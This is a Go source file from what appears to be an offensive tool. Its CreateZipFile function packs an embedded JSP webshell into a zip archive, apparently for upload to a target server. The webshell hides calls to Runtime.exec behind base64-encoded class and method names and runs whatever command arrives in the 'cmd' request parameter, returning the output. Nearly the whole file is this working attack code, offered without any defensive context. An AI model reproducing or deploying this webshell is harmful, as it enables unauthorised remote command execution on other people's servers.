package common

import (
	"archive/zip"
	"bytes"
	"io"
	"math/rand"
	"strings"
	"time"
)

func GenerateRandomStr(randomLength int) string {
	baseStr := "ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789"
	var randomStr strings.Builder
	rand.Seed(time.Now().UnixNano())

	for i := 0; i < randomLength; i++ {
		randomStr.WriteByte(baseStr[rand.Intn(len(baseStr))])
	}

	return randomStr.String()
}

func CreateZipFile(mm string, webshellName2 string) ([]byte, error) {
	shellTemplate := `<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>`

	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)

	f, err := zw.Create(webshellName2)
	if err != nil {
		return nil, err
	}

	_, err = io.WriteString(f, shellTemplate)
	if err != nil {
		return nil, err
	}

	err = zw.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
